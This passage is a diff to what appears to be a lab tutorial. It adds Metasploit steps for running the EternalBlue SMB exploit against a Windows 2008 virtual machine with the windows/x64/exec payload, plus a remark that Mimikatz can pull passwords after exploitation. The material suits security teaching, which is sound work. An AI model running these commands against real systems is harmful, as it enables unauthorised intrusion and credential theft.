@@ -260,3 +260,20 @@ run
 use exploit/windows/smb/ms17_010_eternalblue
 ```
 4. Set the remote host (RHOST) to the Win2008 VM IP
+```
+set RHOST Win2008-IP
+```
+5. Set payload to `windows/x64/exec` (If successful, it can run any one command on the target)
+```
+set payload windows/x64/exec
+```
+6. Set a command to run on the target:
+```
+set CMD command
+```
+7. Run the exploit
+```
+exploit
+```
+
+> Kiwi or Mimikatz 2.0 is a post exploitation tool that may be able to get passwords from vulnerable Windows systems
